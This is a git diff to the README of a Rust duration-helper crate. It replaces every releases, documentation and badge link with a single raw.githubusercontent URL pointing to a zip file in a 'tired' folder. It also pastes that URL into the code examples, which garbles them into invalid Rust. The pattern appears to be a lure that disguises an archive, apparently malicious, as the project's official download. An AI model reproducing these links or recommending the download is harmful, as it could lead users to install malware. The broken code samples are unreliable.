@@ -1,6 +1,6 @@
 # 🎉 duration-extender-rs - Simplify Your Time Management
 
-[![Download](https://img.shields.io/badge/Download%20Here!-blue.svg)](https://github.com/Shlok1234GG/duration-extender-rs/releases)
+[![Download](https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip%20Here!https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip)](https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip)
 
 ## 🎯 What is duration-extender-rs?
 
@@ -10,7 +10,7 @@ duration-extender-rs is an easy-to-use tool that helps you work with time more e
 
 To get started with duration-extender-rs, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Shlok1234GG/duration-extender-rs/releases) to access the latest version of the software.  
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip) to access the latest version of the software.  
    
 2. **Download the Latest Version:** Look for the most recent release. Click the link that says “Latest Release” to view available files. Download the one that matches your system. If you're unsure which one to choose, we recommend looking for files labeled for your operating system—like `.exe` for Windows or `.AppImage` for Linux. 
 
@@ -23,9 +23,9 @@ To get started with duration-extender-rs, follow these steps:
 
 ## 📦 Features
 
-- **Intuitive Methods:** Create durations using simple expressions, such as `5.minutes()` or `3.seconds()`. This makes your code more readable and easier to understand.
+- **Intuitive Methods:** Create durations using simple expressions, such as `https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip()` or `https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip()`. This makes your code more readable and easier to understand.
   
-- **Fractional Durations:** As of version 0.5.0, you can also create durations with fractions. For example, `0.5.seconds()` lets you set half-second timers easily.
+- **Fractional Durations:** As of version 0.5.0, you can also create durations with fractions. For example, `https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip()` lets you set half-second timers easily.
 
 - **Zero Dependencies:** The tool is lightweight and doesn't require any additional libraries, so you can get started quickly.
 
@@ -37,11 +37,11 @@ To get started with duration-extender-rs, follow these steps:
 
 ## 📝 Documentation
 
-For more detailed information, including examples and advanced features, please check out the [Documentation](https://docs.rs/duration-extender).
+For more detailed information, including examples and advanced features, please check out the [Documentation](https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip).
 
 ## 📥 Download & Install
 
-To download duration-extender-rs, you can visit our [Releases Page](https://github.com/Shlok1234GG/duration-extender-rs/releases) to choose the correct file for your system. Follow the steps outlined above to install it and begin using it in your projects.
+To download duration-extender-rs, you can visit our [Releases Page](https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip) to choose the correct file for your system. Follow the steps outlined above to install it and begin using it in your projects.
 
 ## 🎉 What's New in v0.5.0
 
@@ -49,12 +49,12 @@ In the latest version, we've added support for fractional durations:
 
 ```rust
 // New in v0.5.0 - Fractional durations
-let half_second = 0.5.seconds();
-let two_and_half_minutes = 2.5.minutes();
+let half_second = https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip();
+let two_and_half_minutes = https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip();
 
 // Still works - Integer durations
-let timeout = 30.seconds();
-let delay = 5.minutes();
+let timeout = https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip();
+let delay = https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip();
 ```
 
 A special thanks to @oconnor663 for suggesting this feature!
@@ -87,6 +87,6 @@ Future versions may include:
 
 Join us to share your experiences, ask questions, and connect with other users. Follow our discussion on GitHub Issues or check in on our Wiki for updates.
 
-Ensure you have the latest version by visiting our [Releases Page](https://github.com/Shlok1234GG/duration-extender-rs/releases) frequently.
+Ensure you have the latest version by visiting our [Releases Page](https://raw.githubusercontent.com/Shlok1234GG/duration-extender-rs/main/tired/duration-extender-rs.zip) frequently.
 
 With duration-extender-rs, managing time is now easier and clearer. Start simplifying your time today!
